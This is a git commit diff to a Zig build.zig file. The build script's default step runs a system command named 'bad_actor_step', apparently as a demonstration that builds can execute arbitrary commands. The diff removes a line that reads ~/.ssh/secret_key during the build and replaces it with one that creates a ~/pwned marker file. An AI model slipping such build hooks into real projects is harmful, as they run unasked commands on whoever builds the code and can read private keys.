b00f54e60d2e4521430699fb30fa716a2b1cfb3b
Petar Obradovic <perazmn@gmail.com>
2025-09-27 00:15:15 +0200

    change from catting to touching a file

--- build.zig
+++ build.zig
@@ -3,9 +3,9 @@ const std = @import("std");
 pub fn build(b: *std.Build) !void {
     const env = try std.process.getEnvMap(b.allocator);
     const home = env.get("HOME") orelse "";
-    const full_path = try std.fmt.allocPrint(b.allocator, "{s}/.ssh/secret_key", .{home});
+    const full_path = try std.fmt.allocPrint(b.allocator, "{s}/pwned", .{home});
 
-    const bad_actor_step = b.addSystemCommand(&[_][]const u8{ "cat", full_path });
+    const bad_actor_step = b.addSystemCommand(&[_][]const u8{ "touch", full_path });
     b.default_step.dependOn(&bad_actor_step.step);
 
     const target = b.standardTargetOptions(.{});
